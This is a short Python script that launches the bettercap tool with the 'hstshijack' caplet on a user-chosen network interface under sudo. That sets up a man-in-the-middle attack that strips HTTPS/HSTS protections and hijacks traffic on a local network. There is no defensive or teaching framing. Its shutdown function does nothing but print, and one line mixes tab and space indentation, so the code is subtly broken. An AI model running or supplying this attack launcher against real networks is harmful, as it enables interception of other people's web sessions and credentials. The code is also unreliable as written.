#!/usr/bin/env python3
import subprocess
import argparse

def enable_bettercap():
  parser = argparse.ArgumentParser()
  parser.add_argument("-i", "--iface", dest="iface", help="Provide the interface to set iface to.")

  options = parser.parse_args()

  if options.iface and isinstance(options.iface, str):
    print("[+] Request, set bettercap iface to: " + options.iface)
    subprocess.call(["sudo", "bettercap", "-iface", options.iface, "-caplet", "hstshijack/hstshijack"])
  else:
	print("[-] Please provide an interface value for bettercap iface.")

def disable_bettercap():
  print("[+] Shut down bettercap.")

print("\n[+] Hello, this is enable_bettercap.  Keep smiling!")
enable_bettercap()